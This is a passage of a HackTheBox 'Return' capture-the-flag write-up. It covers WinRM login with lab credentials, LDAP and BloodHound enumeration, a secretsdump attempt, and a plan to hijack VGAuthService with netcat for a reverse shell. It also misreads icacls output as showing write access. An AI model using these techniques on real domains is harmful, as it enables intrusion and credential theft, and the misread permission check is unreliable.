</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>vnc<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>vnc<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">5900</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>
</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>ftp<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>ftp<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">21</span><span class="w"> </span>is<span class="w"> </span>closed
</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>
</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span><span class="k">if</span><span class="w"> </span>mssql<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>open<span class="w"> </span>on<span class="w"> </span><span class="k">return</span>.htb...
</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Skipping<span class="w"> </span>mssql<span class="w"> </span>—<span class="w"> </span>port<span class="w"> </span><span class="m">1433</span><span class="w"> </span>is<span class="w"> </span>closed
</span></code></pre></div><br />
it seems that with these creds, we can login only to <code>WINRM</code> and <code>LDAP</code></p>
<p>login via winrm<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="k">return</span>.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc-printer&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;1edFg43012!!&#39;</span>
</span></code></pre></div><br />
grabbed user flag! <code>728d332c51cc0ce7d44fdad354169b54</code></p>
<p>proof<br />
<img alt="" src="../MediaFiles/image%204%201.png" /></p>
<hr />
<h1 id="privesc">Privesc</h1>
<h2 id="ldap-enumeration">LDAP enumeration</h2>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://return.htb<span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span>namingcontexts
</span></code></pre></div>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>dn:
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span><span class="k">return</span>,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>namingcontexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span><span class="k">return</span>,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>namingcontexts:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span><span class="k">return</span>,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span><span class="k">return</span>,DC<span class="o">=</span><span class="nb">local</span>
</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>namingcontexts:<span class="w"> </span><span class="nv">DC</span><span class="o">=</span>ForestDnsZones,DC<span class="o">=</span><span class="k">return</span>,DC<span class="o">=</span><span class="nb">local</span>
</span></code></pre></div>
<p>Lets find all available users in the domain, using ldapsearch with user creds:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>ldapsearch<span class="w"> </span>-LLL<span class="w"> </span>-H<span class="w"> </span>ldap://return.htb<span class="w"> </span><span class="se">\</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;svc-printer@return.local&quot;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;1edFg43012!!&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;DC=return,DC=local&quot;</span><span class="w"> </span><span class="s2">&quot;objectClass=user&quot;</span><span class="w"> </span><span class="p">|</span>
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="w">  </span>egrep<span class="w"> </span>-i<span class="w"> </span>^sAMAccountName<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span>-F<span class="w"> </span><span class="s1">&#39;: &#39;</span><span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>users.txt
</span></code></pre></div></p>
<p>it was successful, and the retrieved user list is:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Administrator
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>Guest
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>PRINTER$
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>krbtgt
</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>svc-printer
</span></code></pre></div></p>
<h3 id="bloodhound-as-svc-printer">Bloodhound as <code>SVC-PRINTER"</code></h3>
<p>Lets try also running bloodhound:<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;svc-printer&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;1edFg43012!!&#39;</span><span class="w"> </span>-d<span class="w"> </span><span class="k">return</span>.local<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.165.239<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
</span></code></pre></div></p>
<p>First things first, we could inspect the user we already have access <code>SVC-PRINTER</code>:<br />
<img alt="" src="../MediaFiles/image%205%201.png" /><br />
it seems that user has no outbound object control</p>
<p>Lets also see its group membership:<br />
<img alt="" src="../MediaFiles/image%206%201.png" /><br />
hm the two that stand out here as non default, are <code>SERVER OPERATORS</code> and <code>PRINT OPERATORS</code> keep that in mind, we will revisit it later.</p>
<p>Inspecting the rest of the users:<br />
<img alt="" src="../MediaFiles/image%207%201.png" /></p>
<p>thats strange, during our ldap enumeration, i found another user <code>Guest</code> that is not present here, lets search it manually on bloodhound:<br />
<img alt="" src="../MediaFiles/image%208%201.png" /><br />
it has no outbound object control</p>
<p>and the group membership is:<br />
<img alt="" src="../MediaFiles/image%209%201.png" /></p>
<p>Now since the above did not indicate any obvious paths for privesc, i then run some of the bloodhound queries to see if i can get anything more there:<br />
<img alt="" src="../MediaFiles/image%2010%201.png" /></p>
<p>Hmmm, we see here that we have <code>CanPSRemote</code> rights towards <code>PRINTER.RETURN.LOCAL</code> so we can login there, BUT what is this?</p>
<p>This icon on bloodhound, indicates that this is a windows host! </p>
<p>And from this computer by gaining <code>SYSTEM</code> or <code>ADMIN RIGHTS</code> we have <code>DCSync</code> rights towards the domain!</p>
<p>So the path is clear here, we need to login to this windows host as <code>SVC-PRINTER</code> and thehmn escalate privileges to become <code>LOCAL ADMIN</code> ( <code>SYSTEM</code> or <code>ADMINISTRATOR</code>) locally and then <code>DCSync</code> towards the domain.</p>
<p>BUT how can we escalate privileges on that host? </p>
<h3 id="group-membership-of-user-svc-printer">Group Membership of user svc-printer</h3>
<p>We could first check the privileges of our user (SVC-PRINTER)<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>whoami<span class="w"> </span>/priv
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>PRIVILEGES<span class="w"> </span>INFORMATION
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>----------------------
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>Privilege<span class="w"> </span>Name<span class="w">                </span>Description<span class="w">                         </span><span class="nv">State</span>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="o">=============================</span><span class="w"> </span><span class="o">===================================</span><span class="w"> </span><span class="o">=======</span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>SeMachineAccountPrivilege<span class="w">     </span>Add<span class="w"> </span>workstations<span class="w"> </span>to<span class="w"> </span>domain<span class="w">          </span>Enabled
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>SeLoadDriverPrivilege<span class="w">         </span>Load<span class="w"> </span>and<span class="w"> </span>unload<span class="w"> </span>device<span class="w"> </span>drivers<span class="w">      </span>Enabled
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>SeSystemtimePrivilege<span class="w">         </span>Change<span class="w"> </span>the<span class="w"> </span>system<span class="w"> </span><span class="nb">time</span><span class="w">              </span>Enabled
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>SeBackupPrivilege<span class="w">             </span>Back<span class="w"> </span>up<span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w">       </span>Enabled
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>SeRestorePrivilege<span class="w">            </span>Restore<span class="w"> </span>files<span class="w"> </span>and<span class="w"> </span>directories<span class="w">       </span>Enabled
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>SeShutdownPrivilege<span class="w">           </span>Shut<span class="w"> </span>down<span class="w"> </span>the<span class="w"> </span>system<span class="w">                </span>Enabled
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>SeChangeNotifyPrivilege<span class="w">       </span>Bypass<span class="w"> </span>traverse<span class="w"> </span>checking<span class="w">            </span>Enabled
</span><span id="__span-17-13"><a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>SeRemoteShutdownPrivilege<span class="w">     </span>Force<span class="w"> </span>shutdown<span class="w"> </span>from<span class="w"> </span>a<span class="w"> </span>remote<span class="w"> </span>system<span class="w"> </span>Enabled
</span><span id="__span-17-14"><a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>SeIncreaseWorkingSetPrivilege<span class="w"> </span>Increase<span class="w"> </span>a<span class="w"> </span>process<span class="w"> </span>working<span class="w"> </span><span class="nb">set</span><span class="w">      </span>Enabled
</span><span id="__span-17-15"><a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>SeTimeZonePrivilege<span class="w">           </span>Change<span class="w"> </span>the<span class="w"> </span><span class="nb">time</span><span class="w"> </span>zone<span class="w">                </span>Enabled
</span></code></pre></div>
<p>Hm, now we must investigate which one from those privileges can lead to <code>local admin</code> escalation</p>
<p>After some research, i found that most probably the one to target should be the <code>SeBackupPrivilege</code> because it can be used to read any file (including SAM, SYSTEM, SECURITY hives).</p>
<p>Also lets see again the user’s details from the inside this time <br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>net<span class="w"> </span>user<span class="w"> </span>svc-printer
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>User<span class="w"> </span>name<span class="w">                    </span>svc-printer
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>Full<span class="w"> </span>Name<span class="w">                    </span>SVCPrinter
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Comment<span class="w">                      </span>Service<span class="w"> </span>Account<span class="w"> </span><span class="k">for</span><span class="w"> </span>Printer
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>User<span class="err">&#39;</span>s<span class="w"> </span>comment
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>Country/region<span class="w"> </span>code<span class="w">          </span><span class="m">000</span><span class="w"> </span><span class="o">(</span>System<span class="w"> </span>Default<span class="o">)</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>Account<span class="w"> </span>active<span class="w">               </span>Yes
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>Account<span class="w"> </span>expires<span class="w">              </span>Never
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>Password<span class="w"> </span>last<span class="w"> </span><span class="nb">set</span><span class="w">            </span><span class="m">5</span>/26/2021<span class="w"> </span><span class="m">1</span>:15:13<span class="w"> </span>AM
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>Password<span class="w"> </span>expires<span class="w">             </span>Never
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>Password<span class="w"> </span>changeable<span class="w">          </span><span class="m">5</span>/27/2021<span class="w"> </span><span class="m">1</span>:15:13<span class="w"> </span>AM
</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>Password<span class="w"> </span>required<span class="w">            </span>Yes
</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>User<span class="w"> </span>may<span class="w"> </span>change<span class="w"> </span>password<span class="w">     </span>Yes
</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>
</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>Workstations<span class="w"> </span>allowed<span class="w">         </span>All
</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>Logon<span class="w"> </span>script
</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>User<span class="w"> </span>profile
</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>Home<span class="w"> </span>directory
</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>Last<span class="w"> </span>logon<span class="w">                   </span><span class="m">5</span>/26/2021<span class="w"> </span><span class="m">1</span>:39:29<span class="w"> </span>AM
</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>
</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>Logon<span class="w"> </span>hours<span class="w"> </span>allowed<span class="w">          </span>All
</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>
</span><span id="__span-19-23"><a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>Local<span class="w"> </span>Group<span class="w"> </span>Memberships<span class="w">      </span>*Print<span class="w"> </span>Operators<span class="w">      </span>*Remote<span class="w"> </span>Management<span class="w"> </span>Use
</span><span id="__span-19-24"><a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a><span class="w">                             </span>*Server<span class="w"> </span>Operators
</span><span id="__span-19-25"><a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>Global<span class="w"> </span>Group<span class="w"> </span>memberships<span class="w">     </span>*Domain<span class="w"> </span>Users
</span><span id="__span-19-26"><a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>The<span class="w"> </span><span class="nb">command</span><span class="w"> </span>completed<span class="w"> </span>successfully.
</span></code></pre></div>
<p>Before moving forward, lets find some information about these groups, (local group membership) because i have not seen them before and i dont see them frequently.</p>
<p>After some research, i found that <code>Server Operators</code> is a built-in privileged group <br />
designed to allow certain administrative actions <strong>without granting full Domain Admin rights</strong>.</p>
<h2 id="what-rights-do-server-operators-have">🧰 <strong>What Rights Do Server Operators Have?</strong></h2>
<p>Members of the <code>Server Operators</code> group on a <strong>domain controller</strong> can:</p>
<table>
<thead>
<tr>
<th>✅ S<strong>ervices</strong></th>
<th>They can modify services (can be used for persistence or privilege escalation).</th>
</tr>
</thead>
<tbody>
<tr>
<td>✅ <strong>Back up and restore files</strong></td>
<td>Grants <strong><code>SeBackupPrivilege</code></strong> and <strong><code>SeRestorePrivilege</code></strong> — allows reading protected files like the <strong>NTDS.dit</strong>, SYSTEM hives, etc.</td>
</tr>
</tbody>
</table>
<p>What we found here was a connection between the privileges <strong><code>SeBackupPrivilege</code></strong> -<strong><code>SeRestorePrivilege</code></strong> and the <code>Server Operators</code> group! We must now find a way to abuse it.</p>
<p>Lets now check the ones that are relevant to our case below:</p>
<h3 id="dumping-ntdsdit-back-up-and-restore-files">Dumping NTDS.dit (<strong>Back up and restore files)</strong></h3>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>secretsdump.py<span class="w"> </span><span class="s1">&#39;return.local/svc-printer:1edFg43012!!&#39;</span>@10.129.165.43
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Impacket<span class="w"> </span>v0.13.0.dev0+20250130.104306.0f4b866<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>RemoteOperations<span class="w"> </span>failed:<span class="w"> </span>DCERPC<span class="w"> </span>Runtime<span class="w"> </span>Error:<span class="w"> </span>code:<span class="w"> </span>0x5<span class="w"> </span>-<span class="w"> </span>rpc_s_access_denied<span class="w"> </span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>DRSR<span class="w"> </span>SessionError:<span class="w"> </span>code:<span class="w"> </span>0x20f7<span class="w"> </span>-<span class="w"> </span>ERROR_DS_DRA_BAD_DN<span class="w"> </span>-<span class="w"> </span>The<span class="w"> </span>distinguished<span class="w"> </span>name<span class="w"> </span>specified<span class="w"> </span><span class="k">for</span><span class="w"> </span>this<span class="w"> </span>replication<span class="w"> </span>operation<span class="w"> </span>is<span class="w"> </span>invalid.
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Something<span class="w"> </span>went<span class="w"> </span>wrong<span class="w"> </span>with<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>approach.<span class="w"> </span>Try<span class="w"> </span>again<span class="w"> </span>with<span class="w"> </span>-use-vss<span class="w"> </span>parameter
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...<span class="w"> </span>
</span></code></pre></div><br />
it was not successful…</p>
<h3 id="services"><strong>Services</strong></h3>
<p>First lets list the services”<br />
<div class="language-bash highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>services
</span></code></pre></div></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Path<span class="w">                                                                                                                 </span>Privileges<span class="w"> </span>Service<span class="w">          </span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>----<span class="w">                                                                                                                 </span>----------<span class="w"> </span>-------<span class="w">          </span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>C:<span class="se">\W</span>indows<span class="se">\A</span>DWS<span class="se">\M</span>icrosoft.ActiveDirectory.WebServices.exe<span class="w">                                                                  </span>True<span class="w"> </span>ADWS<span class="w">             </span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="se">\?</span>?<span class="se">\C</span>:<span class="se">\P</span>rogramData<span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="w"> </span>Defender<span class="se">\D</span>efinition<span class="w"> </span>Updates<span class="se">\{</span>5533AFC7-64B3-4F6E-B453-E35320B35716<span class="o">}</span><span class="se">\M</span>pKslDrv.sys<span class="w">       </span>True<span class="w"> </span>MpKslceeb2796<span class="w">    </span>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>C:<span class="se">\W</span>indows<span class="se">\M</span>icrosoft.NET<span class="se">\F</span>ramework64<span class="se">\v</span><span class="m">4</span>.0.30319<span class="se">\S</span>MSvcHost.exe<span class="w">                                                              </span>True<span class="w"> </span>NetTcpPortSharing
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>C:<span class="se">\W</span>indows<span class="se">\S</span>ysWow64<span class="se">\p</span>erfhost.exe<span class="w">                                                                                           </span>True<span class="w"> </span>PerfHost<span class="w">         </span>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="s2">&quot;C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe&quot;</span><span class="w">                                                </span>False<span class="w"> </span>Sense<span class="w">            </span>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>C:<span class="se">\W</span>indows<span class="se">\s</span>ervicing<span class="se">\T</span>rustedInstaller.exe<span class="w">                                                                                 </span>False<span class="w"> </span>TrustedInstaller<span class="w"> </span>
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="s2">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;</span><span class="w">                                                     </span>True<span class="w"> </span>VGAuthService<span class="w">    </span>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a><span class="s2">&quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot;</span><span class="w">                                                                        </span>True<span class="w"> </span>VMTools<span class="w">          </span>
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="s2">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe&quot;</span><span class="w">                                             </span>True<span class="w"> </span>WdNisSvc<span class="w">         </span>
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="s2">&quot;C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe&quot;</span><span class="w">                                            </span>True<span class="w"> </span>WinDefend<span class="w">        </span>
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a><span class="s2">&quot;C:\Program Files\Windows Media Player\wmpnetwk.exe&quot;</span><span class="w">                                                                      </span>False<span class="w"> </span>WMPNetworkSvc<span class="w"> </span>
</span></code></pre></div>
<p>From all the services above, after searching them the one that stands out is VMware Guest Authentication Service (<strong><em>VGAuthService</em></strong>.exe) since this one handles user authentication between the host and the virtual machines. It appears to be associated with CVE-2022-22977</p>
<p>One common attack i found, was to change the binary path of the service, so we can make the service run a binary of our preference!</p>
<h3 id="modifying-and-exploiting-the-service">Modifying and exploiting the service</h3>
<ol>
<li>First lets verify that we can write to the service’s directory:</li>
</ol>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>icacls<span class="w"> </span><span class="s2">&quot;C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe&quot;</span>
</span></code></pre></div>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\V</span>Mware<span class="se">\V</span>Mware<span class="w"> </span>Tools<span class="se">\V</span>Mware<span class="w"> </span>VGAuth<span class="se">\V</span>GAuthService.exe<span class="w"> </span>BUILTIN<span class="se">\A</span>dministrators:<span class="o">(</span>F<span class="o">)</span>Everyone:<span class="o">(</span>RX<span class="o">)</span>NT<span class="w"> </span>AUTHORITY<span class="se">\S</span>YSTEM:<span class="o">(</span>F<span class="o">)</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>Successfully<span class="w"> </span>processed<span class="w"> </span><span class="m">1</span><span class="w"> </span>files<span class="p">;</span><span class="w"> </span>Failed<span class="w"> </span>processing<span class="w"> </span><span class="m">0</span><span class="w"> </span>files
</span></code></pre></div><br />
it seems that we can write to it!</p>
<ol>
<li>modify the service, replace the binary with netcat</li>
</ol>
<p>We will replace the binary with netcat, in order to get a rev shell back to our machine</p>
<p>first upload <code>nc.exe</code> from evil-winrm<br />
